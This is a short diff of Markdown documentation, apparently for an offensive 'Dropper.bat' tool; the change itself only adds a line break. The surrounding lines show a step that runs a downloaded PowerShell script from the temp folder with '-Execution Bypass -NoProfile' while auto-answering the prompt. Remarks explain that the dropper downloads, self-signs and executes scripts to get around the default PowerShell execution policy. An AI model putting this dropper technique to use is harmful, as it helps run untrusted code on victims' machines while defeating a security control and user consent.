@@ -114,7 +114,7 @@ echo [4] Executing our Downloaded script and bypass user intervention
 cd %tmp% && cmd /c echo A | powershell -Execution Bypass -NoProfile -File my_posh_script.ps1
 pause
 ```
-**Remark:** This batch script must be executed with **admin privileges**
+**Remark:** This batch script must be executed with **admin privileges**<br />
 **Remark:** This Dropper.bat can **Download-PS-Script/Build-Cert/Sign-PS-Script/Execute-PS-Script** because the Policy
 its set by Default to powershell Scripts Only (this policy does not affects batch scripts from running and executing all of this)..
 ![dff](https://user-images.githubusercontent.com/23490060/72754958-28f39380-3bc1-11ea-8eb8-d2c61351ba14.png)
